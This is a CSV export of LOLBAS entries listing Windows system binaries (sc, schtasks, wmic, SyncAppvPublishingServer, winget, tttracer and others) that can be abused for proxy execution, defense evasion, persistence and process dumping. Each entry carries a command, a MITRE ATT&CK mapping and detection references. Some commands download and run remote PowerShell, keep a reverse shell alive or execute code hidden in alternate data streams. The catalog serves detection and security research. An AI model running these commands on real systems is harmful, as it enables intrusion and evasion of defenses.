Filename,Description,Author,Date,Command,Command Description,Command Usecase,Command Category,Command Privileges,MITRE ATT&CK technique,Operating System,Paths,Detections,Resources,Acknowledgements,URL
"Runscripthelper.exe","Execute target PowerShell script","Oddvar Moe","2018-05-25","runscripthelper.exe surfacecheck \\?\C:\Test\Microsoft\Diagnosis\scripts\test.txt C:\Test","Execute the PowerShell script named test.txt","Bypass constrained language mode and execute Powershell script","Execute","User","T1218","Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10","C:\Windows\WinSxS\amd64_microsoft-windows-u..ed-telemetry-client_31bf3856ad364e35_10.0.16299.15_none_c2df1bba78111118\Runscripthelper.exe, C:\Windows\WinSxS\amd64_microsoft-windows-u..ed-telemetry-client_31bf3856ad364e35_10.0.16299.192_none_ad4699b571e00c4a\Runscripthelper.exe","Sigma: https://github.com/SigmaHQ/sigma/blob/08ca62cc8860f4660e945805d0dd615ce75258c1/rules/windows/process_creation/win_susp_runscripthelper.yml, BlockRule: https://docs.microsoft.com/en-us/windows/security/threat-protection/windows-defender-application-control/microsoft-recommended-block-rules, IOC: Event 4014 - Powershell logging, IOC: Event 400","https://posts.specterops.io/bypassing-application-whitelisting-with-runscripthelper-exe-1906923658fc","Matt Graeber (@mattifestation)","http://localhost:4001/lolbas/Binaries/Runscripthelper/"
"Sc.exe","Used by Windows to manage services","Oddvar Moe","2018-05-25","sc create evilservice binPath=""\""c:\\ADS\\file.txt:cmd.exe\"" /c echo works > \""c:\ADS\works.txt\"""" DisplayName= ""evilservice"" start= auto\ & sc start evilservice","Creates a new service and executes the file stored in the ADS.","Execute binary file hidden inside an alternate data stream","ADS","User","T1564.004","Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10, Windows 11","C:\Windows\System32\sc.exe, C:\Windows\SysWOW64\sc.exe","Sigma: https://github.com/SigmaHQ/sigma/blob/ff0f1a0222b5100120ae3e43df18593f904c69c0/rules/windows/process_creation/win_new_service_creation.yml, Sigma: https://github.com/SigmaHQ/sigma/blob/08ca62cc8860f4660e945805d0dd615ce75258c1/rules/windows/process_creation/win_using_sc_to_change_sevice_image_path_by_non_admin.yml, Sigma: https://github.com/SigmaHQ/sigma/blob/ff0f1a0222b5100120ae3e43df18593f904c69c0/rules/windows/process_creation/win_susp_service_path_modification.yml, Splunk: https://github.com/splunk/security_content/blob/18f63553a9dc1a34122fa123deae2b2f9b9ea391/detections/endpoint/sc_exe_manipulating_windows_services.yml, Elastic: https://github.com/elastic/detection-rules/blob/414d32027632a49fb239abb8fbbb55d3fa8dd861/rules/windows/lateral_movement_cmd_service.toml, IOC: Unexpected service creation, IOC: Unexpected service modification","https://oddvar.moe/2018/04/11/putting-data-in-alternate-data-streams-and-how-to-execute-it-part-2/","Oddvar Moe (@oddvarmoe)","http://localhost:4001/lolbas/Binaries/Sc/"
"Sc.exe","Used by Windows to manage services","Oddvar Moe","2018-05-25","sc config <existing> binPath=""\""c:\\ADS\\file.txt:cmd.exe\"" /c echo works > \""c:\ADS\works.txt\"""" & sc start <existing>","Modifies an existing service and executes the file stored in the ADS.","Execute binary file hidden inside an alternate data stream","ADS","User","T1564.004","Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10, Windows 11","C:\Windows\System32\sc.exe, C:\Windows\SysWOW64\sc.exe","Sigma: https://github.com/SigmaHQ/sigma/blob/ff0f1a0222b5100120ae3e43df18593f904c69c0/rules/windows/process_creation/win_new_service_creation.yml, Sigma: https://github.com/SigmaHQ/sigma/blob/08ca62cc8860f4660e945805d0dd615ce75258c1/rules/windows/process_creation/win_using_sc_to_change_sevice_image_path_by_non_admin.yml, Sigma: https://github.com/SigmaHQ/sigma/blob/ff0f1a0222b5100120ae3e43df18593f904c69c0/rules/windows/process_creation/win_susp_service_path_modification.yml, Splunk: https://github.com/splunk/security_content/blob/18f63553a9dc1a34122fa123deae2b2f9b9ea391/detections/endpoint/sc_exe_manipulating_windows_services.yml, Elastic: https://github.com/elastic/detection-rules/blob/414d32027632a49fb239abb8fbbb55d3fa8dd861/rules/windows/lateral_movement_cmd_service.toml, IOC: Unexpected service creation, IOC: Unexpected service modification","https://oddvar.moe/2018/04/11/putting-data-in-alternate-data-streams-and-how-to-execute-it-part-2/","Oddvar Moe (@oddvarmoe)","http://localhost:4001/lolbas/Binaries/Sc/"
"Schtasks.exe","Schedule periodic tasks","Oddvar Moe","2018-05-25","schtasks /create /sc minute /mo 1 /tn ""Reverse shell"" /tr c:\some\directory\revshell.exe","Create a recurring task to execute every minute.","Create a recurring task to keep reverse shell session(s) alive","Execute","User","T1053.005","Windows 7, Windows 8, Windows 8.1, Windows 10, Windows 11","c:\windows\system32\schtasks.exe, c:\windows\syswow64\schtasks.exe","Sigma: https://github.com/SigmaHQ/sigma/blob/59000b993d6280d9bf063eefdcdf30ea0e83aa5e/rules/windows/process_creation/win_susp_schtask_creation.yml, Elastic: https://github.com/elastic/detection-rules/blob/ef7548f04c4341e0d1a172810330d59453f46a21/rules/windows/persistence_local_scheduled_task_creation.toml, Splunk: https://github.com/splunk/security_content/blob/18f63553a9dc1a34122fa123deae2b2f9b9ea391/detections/endpoint/schtasks_scheduling_job_on_remote_system.yml, IOC: Suspicious task creation events","https://isc.sans.edu/forums/diary/Adding+Persistence+Via+Scheduled+Tasks/23633/","","http://localhost:4001/lolbas/Binaries/Schtasks/"
"Schtasks.exe","Schedule periodic tasks","Oddvar Moe","2018-05-25","schtasks /create /s targetmachine /tn ""MyTask"" /tr c:\some\directory\notevil.exe /sc daily","Create a scheduled task on a remote computer for persistence/lateral movement","Create a remote task to run daily relative to the the time of creation","Execute","Administrator","T1053.005","Windows 7, Windows 8, Windows 8.1, Windows 10, Windows 11","c:\windows\system32\schtasks.exe, c:\windows\syswow64\schtasks.exe","Sigma: https://github.com/SigmaHQ/sigma/blob/59000b993d6280d9bf063eefdcdf30ea0e83aa5e/rules/windows/process_creation/win_susp_schtask_creation.yml, Elastic: https://github.com/elastic/detection-rules/blob/ef7548f04c4341e0d1a172810330d59453f46a21/rules/windows/persistence_local_scheduled_task_creation.toml, Splunk: https://github.com/splunk/security_content/blob/18f63553a9dc1a34122fa123deae2b2f9b9ea391/detections/endpoint/schtasks_scheduling_job_on_remote_system.yml, IOC: Suspicious task creation events","https://isc.sans.edu/forums/diary/Adding+Persistence+Via+Scheduled+Tasks/23633/","","http://localhost:4001/lolbas/Binaries/Schtasks/"
"Scriptrunner.exe","Execute binary through proxy binary to evade defensive counter measures","Oddvar Moe","2018-05-25","Scriptrunner.exe -appvscript calc.exe","Executes calc.exe","Execute binary through proxy binary to evade defensive counter measures","Execute","User","T1202","Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10, Windows 11","C:\Windows\System32\scriptrunner.exe, C:\Windows\SysWOW64\scriptrunner.exe","Sigma: https://github.com/SigmaHQ/sigma/blob/765acac3742310764495ed5a2006bc0ced5b1a67/rules/windows/process_creation/win_susp_servu_process_pattern.yml, IOC: Scriptrunner.exe should not be in use unless App-v is deployed","https://twitter.com/KyleHanslovan/status/914800377580503040, https://twitter.com/NickTyrer/status/914234924655312896, https://github.com/MoooKitty/Code-Execution","Nick Tyrer (@nicktyrer)","http://localhost:4001/lolbas/Binaries/Scriptrunner/"
"Scriptrunner.exe","Execute binary through proxy binary to evade defensive counter measures","Oddvar Moe","2018-05-25","ScriptRunner.exe -appvscript ""\\fileserver\calc.cmd""","Executes calc.cmd from remote server","Execute binary through proxy binary from external server to evade defensive counter measures","Execute","User","T1218","Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10, Windows 11","C:\Windows\System32\scriptrunner.exe, C:\Windows\SysWOW64\scriptrunner.exe","Sigma: https://github.com/SigmaHQ/sigma/blob/765acac3742310764495ed5a2006bc0ced5b1a67/rules/windows/process_creation/win_susp_servu_process_pattern.yml, IOC: Scriptrunner.exe should not be in use unless App-v is deployed","https://twitter.com/KyleHanslovan/status/914800377580503040, https://twitter.com/NickTyrer/status/914234924655312896, https://github.com/MoooKitty/Code-Execution","Nick Tyrer (@nicktyrer)","http://localhost:4001/lolbas/Binaries/Scriptrunner/"
"Setres.exe","Configures display settings","Grzegorz Tworek","2022-10-21","setres.exe -w 800 -h 600","Sets the resolution and then launches 'choice' command from the working directory.","Executes arbitrary code","Execute","User","T1218","Windows Server 2012, Windows Server 2016, Windows Server 2019, Windows Server 2022","c:\windows\system32\setres.exe","Sigma: https://github.com/SigmaHQ/sigma/blob/19396788dbedc57249a46efed2bb1927abc376d4/rules/windows/process_creation/proc_creation_win_lolbin_setres.yml, IOC: Unusual location for choice.exe file, IOC: Process created from choice.com binary, IOC: Existence of choice.cmd file","https://twitter.com/0gtweet/status/1583356502340870144","Grzegorz Tworek (@0gtweet)","http://localhost:4001/lolbas/Binaries/Setres/"
"SettingSyncHost.exe","Host Process for Setting Synchronization","Elliot Killick","2021-08-26","SettingSyncHost -LoadAndRunDiagScript anything","Execute file specified in %COMSPEC%","Can be used to evade defensive countermeasures or to hide as a persistence mechanism","Execute","User","T1218","Windows 8, Windows 8.1, Windows 10","C:\Windows\System32\SettingSyncHost.exe, C:\Windows\SysWOW64\SettingSyncHost.exe","Sigma: https://github.com/SigmaHQ/sigma/blob/08ca62cc8860f4660e945805d0dd615ce75258c1/rules/windows/process_creation/win_using_settingsynchost_as_lolbin.yml, IOC: SettingSyncHost.exe should not be run on a normal workstation","https://www.hexacorn.com/blog/2020/02/02/settingsynchost-exe-as-a-lolbin/","Adam (@hexacorn), Elliot Killick (@elliotkillick)","http://localhost:4001/lolbas/Binaries/SettingSyncHost/"
"SettingSyncHost.exe","Host Process for Setting Synchronization","Elliot Killick","2021-08-26","SettingSyncHost -LoadAndRunDiagScriptNoCab anything","Execute a batch script in the background (no window ever pops up) which can be subverted to running arbitrary programs by setting the current working directory to %TMP% and creating files such as reg.bat/reg.exe in that directory thereby causing them to execute instead of the ones in C:\Windows\System32.","Can be used to evade defensive countermeasures or to hide as a persistence mechanism. Additionally, effectively act as a -WindowStyle Hidden option (as there is in PowerShell) for any arbitrary batch file.","Execute","User","T1218","Windows 8, Windows 8.1, Windows 10","C:\Windows\System32\SettingSyncHost.exe, C:\Windows\SysWOW64\SettingSyncHost.exe","Sigma: https://github.com/SigmaHQ/sigma/blob/08ca62cc8860f4660e945805d0dd615ce75258c1/rules/windows/process_creation/win_using_settingsynchost_as_lolbin.yml, IOC: SettingSyncHost.exe should not be run on a normal workstation","https://www.hexacorn.com/blog/2020/02/02/settingsynchost-exe-as-a-lolbin/","Adam (@hexacorn), Elliot Killick (@elliotkillick)","http://localhost:4001/lolbas/Binaries/SettingSyncHost/"
"Stordiag.exe","Storage diagnostic tool","Eral4m","2021-10-21","stordiag.exe","Once executed, Stordiag.exe will execute schtasks.exe systeminfo.exe and fltmc.exe - if stordiag.exe is copied to a folder and an arbitrary executable is renamed to one of these names, stordiag.exe will execute it.","Possible defence evasion purposes.","Execute","User","T1218","Windows 10, Windows 11","c:\windows\system32\stordiag.exe, c:\windows\syswow64\stordiag.exe","Sigma: https://github.com/SigmaHQ/sigma/blob/8b86a79ef0ca2f32c006c327350b76b47b604690/rules/windows/process_creation/process_creation_stordiag_execution.yml, IOC: systeminfo.exe, fltmc.exe or schtasks.exe being executed outside of their normal path of c:\windows\system32\ or c:\windows\syswow64\","https://twitter.com/eral4m/status/1451112385041911809","Eral4m (@eral4m)","http://localhost:4001/lolbas/Binaries/Stordiag/"
"SyncAppvPublishingServer.exe","Used by App-v to get App-v server lists","Oddvar Moe","2018-05-25","SyncAppvPublishingServer.exe ""n;(New-Object Net.WebClient).DownloadString('http://some.url/script.ps1') | IEX""","Example command on how inject Powershell code into the process","Use SyncAppvPublishingServer as a Powershell host to execute Powershell code. Evade defensive counter measures","Execute","User","T1218","Windows 10 1709, Windows 10 1703, Windows 10 1607","C:\Windows\System32\SyncAppvPublishingServer.exe, C:\Windows\SysWOW64\SyncAppvPublishingServer.exe","Sigma: https://github.com/SigmaHQ/sigma/blob/fb750721b25ec4573acc32a0822d047a8ecdf269/rules/windows/deprecated/powershell_syncappvpublishingserver_exe.yml, Sigma: https://github.com/SigmaHQ/sigma/blob/fb750721b25ec4573acc32a0822d047a8ecdf269/rules/windows/deprecated/process_creation_syncappvpublishingserver_exe.yml, IOC: SyncAppvPublishingServer.exe should never be in use unless App-V is deployed","https://twitter.com/monoxgas/status/895045566090010624","Nick Landers (@monoxgas)","http://localhost:4001/lolbas/Binaries/Syncappvpublishingserver/"
"Ttdinject.exe","Used by Windows 1809 and newer to Debug Time Travel (Underlying call of tttracer.exe)","Maxime Nadeau","2020-05-12","TTDInject.exe /ClientParams ""7 tmp.run 0 0 0 0 0 0 0 0 0 0"" /Launch ""C:/Windows/System32/calc.exe""","Execute calc using ttdinject.exe. Requires administrator privileges. A log file will be created in tmp.run. The log file can be changed, but the length (7) has to be updated.","Spawn process using other binary","Execute","Administrator","T1127","Windows 10 2004 and above, Windows 11","C:\Windows\System32\ttdinject.exe, C:\Windows\Syswow64\ttdinject.exe","Sigma: https://github.com/SigmaHQ/sigma/blob/7ea6ed3db65e0bd812b051d9bb4fffd27c4c4d0a/rules/windows/create_remote_thread/create_remote_thread_win_ttdinjec.yml, Sigma: https://github.com/SigmaHQ/sigma/blob/7ea6ed3db65e0bd812b051d9bb4fffd27c4c4d0a/rules/windows/process_creation/proc_creation_win_lolbin_ttdinject.yml, IOC: Parent child relationship. Ttdinject.exe parent for executed command, IOC: Multiple queries made to the IFEO registry key of an untrusted executable (Ex. ""HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\payload.exe"") from the ttdinject.exe process","https://twitter.com/Oddvarmoe/status/1196333160470138880","Oddvar Moe (@oddvarmoe), Maxime Nadeau (@m_nad0)","http://localhost:4001/lolbas/Binaries/Ttdinject/"
"Ttdinject.exe","Used by Windows 1809 and newer to Debug Time Travel (Underlying call of tttracer.exe)","Maxime Nadeau","2020-05-12","ttdinject.exe /ClientScenario TTDRecorder /ddload 0 /ClientParams ""7 tmp.run 0 0 0 0 0 0 0 0 0 0"" /launch ""C:/Windows/System32/calc.exe""","Execute calc using ttdinject.exe. Requires administrator privileges. A log file will be created in tmp.run. The log file can be changed, but the length (7) has to be updated.","Spawn process using other binary","Execute","Administrator","T1127","Windows 10 1909 and below","C:\Windows\System32\ttdinject.exe, C:\Windows\Syswow64\ttdinject.exe","Sigma: https://github.com/SigmaHQ/sigma/blob/7ea6ed3db65e0bd812b051d9bb4fffd27c4c4d0a/rules/windows/create_remote_thread/create_remote_thread_win_ttdinjec.yml, Sigma: https://github.com/SigmaHQ/sigma/blob/7ea6ed3db65e0bd812b051d9bb4fffd27c4c4d0a/rules/windows/process_creation/proc_creation_win_lolbin_ttdinject.yml, IOC: Parent child relationship. Ttdinject.exe parent for executed command, IOC: Multiple queries made to the IFEO registry key of an untrusted executable (Ex. ""HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\payload.exe"") from the ttdinject.exe process","https://twitter.com/Oddvarmoe/status/1196333160470138880","Oddvar Moe (@oddvarmoe), Maxime Nadeau (@m_nad0)","http://localhost:4001/lolbas/Binaries/Ttdinject/"
"Tttracer.exe","Used by Windows 1809 and newer to Debug Time Travel","Oddvar Moe","2019-11-05","tttracer.exe C:\windows\system32\calc.exe","Execute calc using tttracer.exe. Requires administrator privileges","Spawn process using other binary","Execute","Administrator","T1127","Windows 10 1809 and newer, Windows 11","C:\Windows\System32\tttracer.exe, C:\Windows\SysWOW64\tttracer.exe","Sigma: https://github.com/SigmaHQ/sigma/blob/5951ad1d9a781a49d61df9af03c7b83ac67a0012/rules/windows/image_load/process_creation_tttracer_mod_load.yml, Sigma: https://github.com/SigmaHQ/sigma/blob/5951ad1d9a781a49d61df9af03c7b83ac67a0012/rules/windows/image_load/sysmon_tttracer_mod_load.yml, Elastic: https://github.com/elastic/detection-rules/blob/5bdf70e72c6cd4547624c521108189af994af449/rules/windows/credential_access_cmdline_dump_tool.toml, IOC: Parent child relationship. Tttracer parent for executed command","https://twitter.com/oulusoyum/status/1191329746069655553, https://twitter.com/mattifestation/status/1196390321783025666, https://lists.samba.org/archive/cifs-protocol/2016-April/002877.html","Onur Ulusoy (@oulusoyum), Matt Graeber (@mattifestation)","http://localhost:4001/lolbas/Binaries/Tttracer/"
"Tttracer.exe","Used by Windows 1809 and newer to Debug Time Travel","Oddvar Moe","2019-11-05","TTTracer.exe -dumpFull -attach pid","Dumps process using tttracer.exe. Requires administrator privileges","Dump process by PID","Dump","Administrator","T1003","Windows 10 1809 and newer, Windows 11","C:\Windows\System32\tttracer.exe, C:\Windows\SysWOW64\tttracer.exe","Sigma: https://github.com/SigmaHQ/sigma/blob/5951ad1d9a781a49d61df9af03c7b83ac67a0012/rules/windows/image_load/process_creation_tttracer_mod_load.yml, Sigma: https://github.com/SigmaHQ/sigma/blob/5951ad1d9a781a49d61df9af03c7b83ac67a0012/rules/windows/image_load/sysmon_tttracer_mod_load.yml, Elastic: https://github.com/elastic/detection-rules/blob/5bdf70e72c6cd4547624c521108189af994af449/rules/windows/credential_access_cmdline_dump_tool.toml, IOC: Parent child relationship. Tttracer parent for executed command","https://twitter.com/oulusoyum/status/1191329746069655553, https://twitter.com/mattifestation/status/1196390321783025666, https://lists.samba.org/archive/cifs-protocol/2016-April/002877.html","Onur Ulusoy (@oulusoyum), Matt Graeber (@mattifestation)","http://localhost:4001/lolbas/Binaries/Tttracer/"
"Unregmp2.exe","Microsoft Windows Media Player Setup Utility","Wade Hickey","2021-12-06","rmdir %temp%\lolbin /s /q 2>nul & mkdir ""%temp%\lolbin\Windows Media Player"" & copy C:\Windows\System32\calc.exe ""%temp%\lolbin\Windows Media Player\wmpnscfg.exe"" >nul && cmd /V /C ""set ""ProgramW6432=%temp%\lolbin"" && unregmp2.exe /HideWMP""","Allows an attacker to copy a target binary to a controlled directory and modify the 'ProgramW6432' environment variable to point to that controlled directory, then execute 'unregmp2.exe' with argument '/HideWMP' which will spawn a process at the hijacked path '%ProgramW6432%\wmpnscfg.exe'.","Proxy execution of binary","Execute","User","T1202","Windows 10","C:\Windows\System32\unregmp2.exe, C:\Windows\SysWOW64\unregmp2.exe","Sigma: https://github.com/SigmaHQ/sigma/blob/197615345b927682ab7ad7fa3c5f5bb2ed911eed/rules/windows/process_creation/proc_creation_win_lolbin_unregmp2.yml, IOC: Low-prevalence binaries, with filename 'wmpnscfg.exe', spawned as child-processes of `unregmp2.exe /HideWMP`","https://twitter.com/notwhickey/status/1466588365336293385","Wade Hickey (@notwhickey)","http://localhost:4001/lolbas/Binaries/Unregmp2/"
"vbc.exe","Binary file used for compile vbs code","Lior Adar","2020-02-27","vbc.exe /target:exe c:\temp\vbs\run.vb","Binary file used by .NET to compile Visual Basic code to an executable.","Compile attacker code on system. Bypass defensive counter measures.","Compile","User","T1127","Windows 7, Windows 10, Windows 11","C:\Windows\Microsoft.NET\Framework64\v4.0.30319\vbc.exe, C:\Windows\Microsoft.NET\Framework64\v3.5\vbc.exe","Sigma: https://github.com/SigmaHQ/sigma/blob/08ca62cc8860f4660e945805d0dd615ce75258c1/rules/windows/process_creation/win_visual_basic_compiler.yml, Elastic: https://github.com/elastic/detection-rules/blob/61afb1c1c0c3f50637b1bb194f3e6fb09f476e50/rules/windows/defense_evasion_dotnet_compiler_parent_process.toml","","Lior Adar, Hai Vaknin(Lux)","http://localhost:4001/lolbas/Binaries/Vbc/"
"vbc.exe","Binary file used for compile vbs code","Lior Adar","2020-02-27","vbc -reference:Microsoft.VisualBasic.dll c:\temp\vbs\run.vb","Binary file used by .NET to compile Visual Basic code to an executable.","Compile attacker code on system. Bypass defensive counter measures.","Compile","User","T1127","Windows 7, Windows 10, Windows 11","C:\Windows\Microsoft.NET\Framework64\v4.0.30319\vbc.exe, C:\Windows\Microsoft.NET\Framework64\v3.5\vbc.exe","Sigma: https://github.com/SigmaHQ/sigma/blob/08ca62cc8860f4660e945805d0dd615ce75258c1/rules/windows/process_creation/win_visual_basic_compiler.yml, Elastic: https://github.com/elastic/detection-rules/blob/61afb1c1c0c3f50637b1bb194f3e6fb09f476e50/rules/windows/defense_evasion_dotnet_compiler_parent_process.toml","","Lior Adar, Hai Vaknin(Lux)","http://localhost:4001/lolbas/Binaries/Vbc/"
"Verclsid.exe","Used to verify a COM object before it is instantiated by Windows Explorer","@bohops","2018-12-04","verclsid.exe /S /C {CLSID}","Used to verify a COM object before it is instantiated by Windows Explorer","Run a com object created in registry to evade defensive counter measures","Execute","User","T1218.012","Windows 10, Windows 11","C:\Windows\System32\verclsid.exe, C:\Windows\SysWOW64\verclsid.exe","Sigma: https://github.com/SigmaHQ/sigma/blob/08ca62cc8860f4660e945805d0dd615ce75258c1/rules/windows/process_creation/win_verclsid_runs_com.yml, Splunk: https://github.com/splunk/security_content/blob/a1afa0fa605639cbef7d528dec46ce7c8112194a/detections/endpoint/verclsid_clsid_execution.yml","https://gist.github.com/NickTyrer/0598b60112eaafe6d07789f7964290d5, https://bohops.com/2018/08/18/abusing-the-com-registry-structure-part-2-loading-techniques-for-evasion-and-persistence/","Nick Tyrer (@NickTyrer)","http://localhost:4001/lolbas/Binaries/Verclsid/"
"Wab.exe","Windows address book manager","Oddvar Moe","2018-05-25","wab.exe","Change HKLM\Software\Microsoft\WAB\DLLPath and execute DLL of choice","Execute dll file. Bypass defensive counter measures","Execute","Administrator","T1218","Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10, Windows 11","C:\Program Files\Windows Mail\wab.exe, C:\Program Files (x86)\Windows Mail\wab.exe","Sigma: https://github.com/SigmaHQ/sigma/blob/a80c29a7c2e2e500a1a532db2a2a8bd69bd4a63d/rules/windows/registry_event/sysmon_wab_dllpath_reg_change.yml, IOC: WAB.exe should normally never be used","https://twitter.com/Hexacorn/status/991447379864932352, http://www.hexacorn.com/blog/2018/05/01/wab-exe-as-a-lolbin/","Adam (@Hexacorn)","http://localhost:4001/lolbas/Binaries/Wab/"
"winget.exe","Windows Package Manager tool","Paul Sanders","2022-01-03","winget.exe install --manifest manifest.yml","Downloads a file from the web address specified in manifest.yml and executes it on the system. Local manifest setting must be enabled in winget for it to work: ""winget settings --enable LocalManifestFiles""","Download and execute an arbitrary file from the internet","Execute","Local Aministrator - required to enabled local manifest setting","T1105","Windows 10, Windows 11","C:\Users\user\AppData\Local\Microsoft\WindowsApps\winget.exe","IOC: winget.exe spawned with local manifest file, IOC: Sysmon Event ID 1 - Process Creation, Analysis: https://saulpanders.github.io/2022/01/02/New-Year-New-LOLBAS.html, Sigma: https://github.com/SigmaHQ/sigma/blob/8bb3379b6807610d61d29db1d76f5af4840b8208/rules/windows/process_creation/proc_creation_win_lolbin_execution_via_winget.yml","https://saulpanders.github.io/2022/01/02/New-Year-New-LOLBAS.html, https://docs.microsoft.com/en-us/windows/package-manager/winget/#production-recommended","Paul (@saulpanders)","http://localhost:4001/lolbas/Binaries/Winget/"
"Wlrmdr.exe","Windows Logon Reminder executable","Moshe Kaplan","2022-02-16","wlrmdr.exe -s 3600 -f 0 -t _ -m _ -a 11 -u calc.exe","Execute calc.exe with wlrmdr.exe as parent process","Use wlrmdr as a proxy binary to evade defensive countermeasures","Execute","User","T1202","Windows 10, Windows 11","c:\windows\system32\wlrmdr.exe","Sigma: https://github.com/SigmaHQ/sigma/blob/35a7244c62820fbc5a832e50b1e224ac3a1935da/rules/windows/process_creation/proc_creation_win_lolbin_wlrmdr.yml, IOC: wlrmdr.exe spawning any new processes","https://twitter.com/0gtweet/status/1493963591745220608, https://twitter.com/Oddvarmoe/status/927437787242090496, https://twitter.com/falsneg/status/1461625526640992260, https://docs.microsoft.com/en-us/windows/win32/api/shellapi/ns-shellapi-notifyicondataw","Grzegorz Tworek (@0gtweet), Oddvar Moe (@Oddvarmoe), Freddy (@falsneg)","http://localhost:4001/lolbas/Binaries/Wlrmdr/"
"Wmic.exe","The WMI command-line (WMIC) utility provides a command-line interface for WMI","Oddvar Moe","2018-05-25","wmic.exe process call create ""c:\ads\file.txt:program.exe""","Execute a .EXE file stored as an Alternate Data Stream (ADS)","Execute binary file hidden in Alternate data streams to evade defensive counter measures","ADS","User","T1564.004","Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10, Windows 11","C:\Windows\System32\wbem\wmic.exe, C:\Windows\SysWOW64\wbem\wmic.exe","Sigma: https://github.com/SigmaHQ/sigma/blob/8beb70e970b814d0ab60625206ea0d8a21a9bff8/rules/windows/image_load/sysmon_wmic_remote_xsl_scripting_dlls.yml, Sigma: https://github.com/SigmaHQ/sigma/blob/ff0f1a0222b5100120ae3e43df18593f904c69c0/rules/windows/process_creation/win_xsl_script_processing.yml, Sigma: https://github.com/SigmaHQ/sigma/blob/08ca62cc8860f4660e945805d0dd615ce75258c1/rules/windows/process_creation/win_bypass_squiblytwo.yml, Sigma: https://github.com/SigmaHQ/sigma/blob/c90e31275d2f98b21e55df8a46d0678cfca458d6/rules/windows/process_creation/win_susp_wmic_eventconsumer_create.yml, Elastic: https://github.com/elastic/detection-rules/blob/414d32027632a49fb239abb8fbbb55d3fa8dd861/rules/windows/defense_evasion_suspicious_wmi_script.toml, Elastic: https://github.com/elastic/detection-rules/blob/61afb1c1c0c3f50637b1bb194f3e6fb09f476e50/rules/windows/persistence_via_windows_management_instrumentation_event_subscription.toml, Elastic: https://github.com/elastic/detection-rules/blob/82ec6ac1eeb62a1383792719a1943b551264ed16/rules/windows/defense_evasion_suspicious_managedcode_host_process.toml, Splunk: https://github.com/splunk/security_content/blob/961a81d4a5cb5c5febec4894d6d812497171a85c/detections/endpoint/xsl_script_execution_with_wmic.yml, Splunk: https://github.com/splunk/security_content/blob/3f77e24974239fcb7a339080a1a483e6bad84a82/detections/endpoint/remote_wmi_command_attempt.yml, Splunk: https://github.com/splunk/security_content/blob/3f77e24974239fcb7a339080a1a483e6bad84a82/detections/endpoint/remote_process_instantiation_via_wmi.yml, Splunk: https://github.com/splunk/security_content/blob/08ed88bd88259c03c771c30170d2934ed0a8f878/detections/endpoint/process_execution_via_wmi.yml, BlockRule: https://docs.microsoft.com/en-us/windows/security/threat-protection/windows-defender-application-control/microsoft-recommended-block-rules, IOC: Wmic retrieving scripts from remote system/Internet location, IOC: DotNet CLR libraries loaded into wmic.exe, IOC: DotNet CLR Usage Log - wmic.exe.log","https://stackoverflow.com/questions/24658745/wmic-how-to-use-process-call-create-with-a-specific-working-directory, https://subt0x11.blogspot.no/2018/04/wmicexe-whitelisting-bypass-hacking.html, https://twitter.com/subTee/status/986234811944648707","Casey Smith (@subtee)","http://localhost:4001/lolbas/Binaries/Wmic/"
